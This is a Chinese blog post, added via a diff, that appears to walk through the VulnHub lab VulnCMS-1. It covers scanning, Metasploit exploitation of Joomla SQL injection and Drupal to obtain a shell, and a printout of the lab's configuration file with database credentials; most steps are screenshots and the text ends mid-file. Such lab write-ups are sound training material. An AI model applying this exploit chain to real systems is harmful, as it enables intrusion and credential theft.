@@ -1,0 +1,1660 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="VulnCMS-1复现\r环境搭建\r搭建靶场环境我选择的是使用Vmware + VirtualBox，Vmware运行kali攻击机，VirtualBox运行Vulnhub靶机的方案，整体拓扑为：\n">
+<title>VulnCMS-1复现</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/vulncms-1%E5%A4%8D%E7%8E%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="VulnCMS-1复现">
+<meta property='og:description' content="VulnCMS-1复现\r环境搭建\r搭建靶场环境我选择的是使用Vmware + VirtualBox，Vmware运行kali攻击机，VirtualBox运行Vulnhub靶机的方案，整体拓扑为：\n">
+<meta property='og:url' content='https://Oight.github.io/p/vulncms-1%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-05-07T10:30:35&#43;08:00'/><meta property='article:modified_time' content='2026-05-07T10:30:35&#43;08:00'/>
+<meta name="twitter:title" content="VulnCMS-1复现">
+<meta name="twitter:description" content="VulnCMS-1复现\r环境搭建\r搭建靶场环境我选择的是使用Vmware + VirtualBox，Vmware运行kali攻击机，VirtualBox运行Vulnhub靶机的方案，整体拓扑为：\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🐧</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">Talk is cheap. Show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#环境搭建">环境搭建</a>
+      <ol>
+        <li><a href="#具体配置">具体配置：</a>
+          <ol>
+            <li><a href="#vmware">Vmware</a></li>
+            <li><a href="#virtualbox">VirtualBox</a></li>
+          </ol>
+        </li>
+        <li><a href="#漏洞复现">漏洞复现</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" >
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/vulncms-1%E5%A4%8D%E7%8E%B0/">VulnCMS-1复现</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-05-07</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="vulncms-1复现">VulnCMS-1复现
+</h1><h2 id="环境搭建">环境搭建
+</h2><p>搭建靶场环境我选择的是使用Vmware + VirtualBox，Vmware运行kali攻击机，VirtualBox运行Vulnhub靶机的方案，整体拓扑为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  宿主机（Windows) : 192.168.56.1
+</span></span><span class="line"><span class="cl">  ├─ VMware Workstation → Kali Linux（主力攻击机）:192.168.56.101
+</span></span><span class="line"><span class="cl">  └─ Oracle VirtualBox → VulnHub靶机: 192.168.56.102
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="具体配置">具体配置：
+</h3><h4 id="vmware">Vmware
+</h4><p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrms9vhj30oz0lltev.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415130029235"
+	
+	
+></p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrn10hej30th0y5qbo.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415130231211"
+	
+	
+></p>
+<p>如图，将VMnet0桥接至VirtualBox的虚拟网卡上</p>
+<h4 id="virtualbox">VirtualBox
+</h4><p>VirtualBox 主界面，选中靶机，点击“设置”。</p>
+<p>选择“网络” -&gt; “网卡 1”。</p>
+<p>连接方式选择：仅主机 (Host-Only) 网络。</p>
+<p>验证：</p>
+<p>在kali中使用ifconfig：</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrnmfatj30kg07u43x.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415130711680"
+	
+	
+></p>
+<p>可以看到Kali 已经成功拿到了 192.168.56.101 这个地址。说明 VMware 已经成功“挂载”到了 VirtualBox 的虚拟网卡上。</p>
+<h3 id="漏洞复现">漏洞复现
+</h3><p>本次的靶机选取的是vulnhub中的VulnCMS-1</p>
+<p>渗透测试本质是信息搜集，所以我们先做下c段嗅探，使用nmap来扫描192.168.56.0/24 段内存活的主机地址：</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax4.sinaimg.cn/large/009XQ7msgy1icwnrnxqifj312v0eenan.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415131249023"
+	
+	
+></p>
+<p>可以看到，1是网关地址，100是DHCP服务器，101是我们的kali攻击机，则102即为我们的靶机地址，继续使用nmap扫下端口，看看靶机上都跑了哪些服务</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrovgt5j30za0dhgy9.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415131954549"
+	
+	
+></p>
+<p>可以看到这里开放了22，80，5000，8081和9001端口，22端口是ssh，80端口是http服务</p>
+<p>先探测一下web服务，这里我们使用gobuster, Gobuster 是一款用 Go 编写的高效目录、文件、DNS 子域及虚拟主机枚举工具，常用于渗透测试和信息收集。</p>
+<p>我们来枚举一下目录：</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrpds2tj30yd0jldyp.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415132551109"
+	
+	
+></p>
+<p>访问一下<code>http://192.168.56.102/vulnerable/</code></p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrpvvydj30sx0blwj8.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415133027007"
+	
+	
+></p>
+<p>是几张图片</p>
+<p>访问robots.txt:</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrpk35ej30r90750ts.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415132713472"
+	
+	
+></p>
+<p>/about.html:</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrpqlyfj31yz0fawlo.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415132903969"
+	
+	
+></p>
+<p>似乎没什么有用的信息</p>
+<p>访问一下其它端口</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax3.sinaimg.cn/large/009XQ7msgy1icwnrq4rx1j30rw120n60.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415133218787"
+	
+	
+></p>
+<p>5000端口上跑了一个WordPress</p>
+<p>访问helloworld的时候发现跳转到了<code>http://fsociety.web:5000/hello-world/</code></p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrqd2wxj31z30zdtmd.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415133352036"
+	
+	
+></p>
+<p>继续探测WordPress服务的web目录</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrroyr2j31630v6e81.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415140733940"
+	
+	
+></p>
+<p>可以发现有wp-login.php和rss</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrs79kxj30on0hygrg.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415140920524"
+	
+	
+></p>
+<p>在rss里发现了版本信息： WordPress/5.7.2，但很遗憾这个版本似乎没有什么可利用的CVE</p>
+<p>wp-admin.php也没有弱密码</p>
+<p>先换个端口探测</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrsn3oyj30qb0qwe4s.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415142007994"
+	
+	
+></p>
+<p>看到8081端口有README.txt</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrsxddaj30tb0wstnm.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415142050597"
+	
+	
+></p>
+<p>所以8081上跑了一个Joomla ，Joomla是一个开源的内容管理系统（cms），联想到这个靶机的名字是VulnCMS，应该是在这里做文章</p>
+<p>使用joomscan进行扫描：</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrtex97j30oc0rrkfl.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415142541155"
+	
+	
+></p>
+<p>可以看到这里跑的Joomla版本是3.4.3，第一个就是SQL注入漏洞</p>
+<p>可以用msf利用，具体漏洞分析会写在最后</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax4.sinaimg.cn/large/009XQ7msgy1icwnrtpflij30w70alk0o.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415151207323"
+	
+	
+></p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnruslrdj31220j7twv.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415151502240"
+	
+	
+></p>
+<p>直接读取到了数据库信息，可以看到这里有一个和其他的都不一样的邮箱</p>
+<p>继续探测9001端口</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax4.sinaimg.cn/large/009XQ7msgy1icwnrvsaswj30l00qtqmt.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415151855498"
+	
+	
+></p>
+<p>可以看到依旧有README.txt ，</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax3.sinaimg.cn/large/009XQ7msgy1icwnrw0h1zj30pc0faadn.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415151930658"
+	
+	
+></p>
+<p>9001端口跑的是Drupal，Drupal 是一个使用 PHP 语言编写的开源内容管理框架（CMF）</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax4.sinaimg.cn/large/009XQ7msgy1icwnrw8v4aj30pg0cu78p.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415152051591"
+	
+	
+></p>
+<p>可以在/CHANGELOG.txt中看到这里的版本是7.54</p>
+<p>同样使用msf看看有没有直接可利用的exp</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrwlgvkj30u00ls7m6.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415152453330"
+	
+	
+></p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrxarzmj30sb0ax117.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415153256269"
+	
+	
+></p>
+<p>拿到shell</p>
+<p>可以发现现在是低权限用户，先看一眼文件</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax3.sinaimg.cn/large/009XQ7msgy1icwnrxk1haj30ao0kqn1i.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415153909974"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// configuration.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">JConfig</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$offline</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$offline_message</span> <span class="o">=</span> <span class="s1">&#39;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$display_offline_message</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$offline_image</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sitename</span> <span class="o">=</span> <span class="s1">&#39;fsociety&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$editor</span> <span class="o">=</span> <span class="s1">&#39;tinymce&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$captcha</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$list_limit</span> <span class="o">=</span> <span class="s1">&#39;20&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$access</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$debug_lang</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$dbtype</span> <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;joomla_admin&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;j00m1_@_dBpA$$&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$db</span> <span class="o">=</span> <span class="s1">&#39;joomla_db&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$dbprefix</span> <span class="o">=</span> <span class="s1">&#39;hs23w_&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$live_site</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="s1">&#39;E2WM78yuyqAzib9N&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$gzip</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$error_reporting</span> <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$helpurl</span> <span class="o">=</span> <span class="s1">&#39;https://help.joomla.org/proxy/index.php?option=com_help&amp;amp;keyref=Help{major}{minor}:{keyref}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$ftp_host</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$ftp_port</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$ftp_user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$ftp_pass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$ftp_root</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$ftp_enable</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">&#39;UTC&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$mailonline</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$mailer</span> <span class="o">=</span> <span class="s1">&#39;mail&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="s1">&#39;Fluntence54@armyspy.com&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$fromname</span> <span class="o">=</span> <span class="s1">&#39;fsociety&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sendmail</span> <span class="o">=</span> <span class="s1">&#39;/usr/sbin/sendmail&#39;</span><span class="p">;</span>
